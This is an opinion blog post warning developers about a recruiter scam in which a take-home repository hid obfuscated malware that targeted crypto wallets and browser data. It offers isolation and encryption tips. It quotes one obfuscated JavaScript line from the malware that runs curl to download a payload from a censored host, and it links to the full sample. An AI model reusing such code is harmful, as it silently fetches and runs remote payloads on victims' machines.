---
aliases:
- /en/you-could-lose-all-your-crypto-in-a-job-interview/
authors:
- Eduardo Zepeda
categories:
- opinion
coverImage: images/tech-interview-hacking-obfuscated-code.jpg
date: '2024-12-14T22:24:22-06:00'
description: This is the story about a guy who was about to lose all his crypto and
  probably get hacked in a job interview for a remote position
keyword: ''
keywords:
- crypto
- interview
- github
- hacking
- docker
title: You Could Lose All Your Crypto In a Job Interview
---

The other day I was browsing Elon Musk's political propaganda machine, also known as X, and came across this gem of human shamelessness, an interviewer who nearly hacked one of his applicants.

## Running malware in job interviews.

The story goes like this: you're in need of a job, you're attending the interview remotely, [the recruiter asks you to clone a Github library]({{< ref path="/posts/git/el-problema-de-usar-github-para-evaluar-a-desarrolladores/index.md" lang="en" >}}) to find bugs in the code, an average interview for a developer position, all looks normal up to this point. Of course you, in need of a good job, decide to go through with the process.

Well, this guy was smart enough to read the code to be executed before blindly executing his voluminous *node_modules* directory. And what did he find? A succulent and delicious minimized code, also obfuscated and with hints of putting your computer to mine cryptocurrencies. 

Our friend was like George, curious, so he reformated the code and found:

- Lines that appear to search and read the contents of Solana wallets.
- Scripts that scan browser directories.  
- [API calls to an IP address]({{< ref path="/posts/software-architecture/caracteristicas-basicas-de-una-api-rest/index.md" lang="en" >}}), with no domain, some with no response at all and some that download obfuscated Python scripts (I guess it follows up the hacking process by installing a backdoor or some RAT).


If you want to ~~infect yourself~~ read the code, visit [the github repository](https://gist.github.com/jbrit/9a6525d086411a0fcffea202f368e780#file-initial-obfuscated-iife-js#?), I take no responsibility for anything though.

``` javascript
_0x42b722(“curl -Lo” + _0x157519 + “\” + “http://<censored>/pdown” + “\””, (_0x204dd7, _0x6e1c16, _0x52b515) => {
  if (_0x204dd7) {
    _0x517b73 = 0;
    return void _0x70af27();
  })
```

{{<ad>}}

## How do we avoid falling into these traps?

I don't plan to stand alone in the drama. This is about offering some practical solutions so that script kiddies don't make fun of you:

### **Use a different device**.

The most comfortable option, but also the most expensive, keep your devices separate, use one computer for work and technical interviews and another for your personal stuff, cryptocurrencies included. 

**Read the code, whenever possible**.

Recruiter sends you a script? Examine it carefully before you run it. Yes, I know, sometimes the code is too long or obfuscated, but if you have some experience, you can rapidly examine the screen with your eyes and spot the most obvious red flags. Of course, you can't waste all afternoon on this especially if you're in a real interview or value your time.

### **Use a virtual machine**.

Mount a virtual machine, either Virtual Box or Gnome Boxes, on Linux, or a [completely isolated Docker container](/en/docker/the-most-useful-and-basic-docker-commands/), if you don't mind not having a graphical interface. 

Another option available, and my personal favorite: a live USB with the distribution of your choice (Debian, Fedora, or whatever you want), 

That way, the worst that can happen is that they infect your virtual machine and not your real computer with all your personal information. Just be careful with shared volumes! If you mount the hard drive that contains sensitive information in the VM, you're toast.

**Encrypt your sensitive information**.

Here comes in the classic advice from old-school IT veterans: **encrypt your important data**. If someone manages to access your collection of kitten memes,it will be just a garbage of non-sense zeroes and ones. 

I don't plan to offer details because there is already too much information on the internet about GPG and its alternatives, Google GPG or read the manual directly, if you are not that familiar with the terminal or don't want to become a Linux or math nerd, there are tools like Kleopatra, which could make cryptography more intuitive to use.

## Don't run arbitrary code on your personal machine.

Do you have better ideas to protect us from black hat interviews? Drop your tips on social media and tag me. I look forward to adding your suggestions to the post. 

If you want to read the full story give Elon's blog a visit.... I mean X. Edited: the owner of the account changed his privacy settings so now you can't watch the full conversation.